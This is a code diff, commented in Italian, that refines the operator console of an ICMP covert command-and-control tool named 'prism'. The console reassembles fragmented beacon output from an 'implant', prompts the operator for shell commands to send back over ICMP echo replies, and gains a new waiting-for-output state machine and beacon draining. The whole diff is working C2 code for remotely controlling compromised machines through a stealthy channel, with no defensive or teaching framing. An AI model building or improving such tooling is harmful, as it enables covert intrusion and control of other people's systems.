@@ -56,6 +56,9 @@ static size_t  reassembly_len   = 0;
 static int     reassembly_total = 0;   /* total fragments attesi */
 static int     reassembly_got   = 0;   /* fragments ricevuti finora */
 
+/* ── Stato state machine ── */
+static int waiting_output = 0;  /* 1 = comando inviato, aspetto output reale */
+
 static uint16_t icmp_checksum(const uint8_t *buf, size_t len)
 {
     uint32_t sum = 0;
@@ -98,6 +101,26 @@ static size_t build_reply_payload(uint8_t *out, size_t out_max,
     }
 
     return total;
+}
+
+/* ── Helper: leggi comando da stdin con timeout 30s ── */
+static const char *read_cmd(char *buf, size_t buflen, const char *implant_ip)
+{
+    printf("prism@%s> ", implant_ip);
+    fflush(stdout);
+
+    struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
+    fd_set fds;
+    FD_ZERO(&fds);
+    FD_SET(STDIN_FILENO, &fds);
+
+    if (select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0
+        && fgets(buf, (int)buflen, stdin)) {
+        size_t len = strlen(buf);
+        if (len > 0 && buf[len-1] == '\n') buf[--len] = '\0';
+        return (len > 0) ? buf : "NOP";
+    }
+    return "NOP";
 }
 
 int main(void)
@@ -198,15 +221,15 @@ int main(void)
                 reassembly_buf[reassembly_len] = '\0';
                 fragmentation_done = 1;
 
-                /* Messaggi silenziosi: non stampare PRISM_INIT e OK */
+                /* Stampa output solo se non è un messaggio di stato */
                 if (strcmp((char *)reassembly_buf, "PRISM_INIT") != 0 &&
                     strcmp((char *)reassembly_buf, "OK") != 0) {
 
                     if (frag_total > 1)
-                        printf("\n[output da %s — %d fragment(i)]\n%s",
+                        printf("\n[output da %s — %d fragment(i)]\n%s\n",
                                implant_ip, frag_total, (char *)reassembly_buf);
                     else
-                        printf("\n[output da %s]\n%s",
+                        printf("\n[output da %s]\n%s\n",
                                implant_ip, (char *)reassembly_buf);
                 }
             } else {
@@ -217,29 +240,52 @@ int main(void)
             }
         }
 
-        /* Determina cosa rispondere */
+        /* ── State machine corretta ── */
         const char *to_send;
 
         if (!fragmentation_done) {
-            /* Fragment intermedio: NOP automatico, non chiedere comando */
+            /* Fragment intermedio: NOP automatico */
             to_send = "NOP";
+
         } else {
-            /* Output completo ricevuto: leggi comando dall'operatore */
-            printf("\nprism@%s> ", implant_ip);
-            fflush(stdout);
+            int is_init = (strcmp((char *)reassembly_buf, "PRISM_INIT") == 0);
+            int is_ok   = (strcmp((char *)reassembly_buf, "OK") == 0);
 
-            struct timeval tv = { .tv_sec = 4, .tv_usec = 0 };
-            fd_set fds;
-            FD_ZERO(&fds);
-            FD_SET(STDIN_FILENO, &fds);
-
-            if (select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0
-                && fgets(cmd_input, sizeof(cmd_input), stdin)) {
-                size_t len = strlen(cmd_input);
-                if (len > 0 && cmd_input[len-1] == '\n') cmd_input[--len] = '\0';
-                to_send = (len > 0) ? cmd_input : "NOP";
-            } else {
+            if (is_ok && waiting_output) {
+                /* Abbiamo inviato un comando ma l'implant non ha ancora
+                 * prodotto output — sta ancora girando. Aspetta. */
                 to_send = "NOP";
+
+            } else if (is_init) {
+                /* Prima connessione: mostra banner e chiedi primo comando */
+                printf("[+] Implant connesso da %s\n\n", implant_ip);
+                waiting_output = 0;
+                /* Drain beacon accumulati prima di mostrare il prompt */
+                { uint8_t db[BUF_SIZE];
+                  while (recvfrom(sock,db,sizeof(db),MSG_DONTWAIT,NULL,NULL)>0); }
+                to_send = read_cmd(cmd_input, sizeof(cmd_input), implant_ip);
+                if (strcmp(to_send, "NOP") != 0)
+                    waiting_output = 1;
+
+            } else if (is_ok) {
+                /* Implant pronto, nessun comando pendente: chiedi comando */
+                waiting_output = 0;
+                /* Drain beacon accumulati — evita prompt multipli dopo idle */
+                { uint8_t db[BUF_SIZE];
+                  while (recvfrom(sock,db,sizeof(db),MSG_DONTWAIT,NULL,NULL)>0); }
+                to_send = read_cmd(cmd_input, sizeof(cmd_input), implant_ip);
+                if (strcmp(to_send, "NOP") != 0)
+                    waiting_output = 1;
+
+            } else {
+                /* Output reale ricevuto: resetta stato e chiedi prossimo comando */
+                waiting_output = 0;
+                /* Drain beacon accumulati prima del prossimo prompt */
+                { uint8_t db[BUF_SIZE];
+                  while (recvfrom(sock,db,sizeof(db),MSG_DONTWAIT,NULL,NULL)>0); }
+                to_send = read_cmd(cmd_input, sizeof(cmd_input), implant_ip);
+                if (strcmp(to_send, "NOP") != 0)
+                    waiting_output = 1;
             }
         }
 
@@ -265,6 +311,15 @@ int main(void)
 
         sendto(sock, reply_buf, reply_pkt_len, 0,
                (struct sockaddr *)&src_addr, src_len);
+
+        /* Drain beacon bufferizzati mentre eravamo in read_cmd.
+         * Evita che lo stesso output venga stampato più volte. */
+        if (strcmp(to_send, "NOP") != 0) {
+            uint8_t drain_buf[BUF_SIZE];
+            while (recvfrom(sock, drain_buf, sizeof(drain_buf),
+                            MSG_DONTWAIT, NULL, NULL) > 0)
+                ; /* scarta beacon accumulati */
+        }
     }
 
     close(sock);
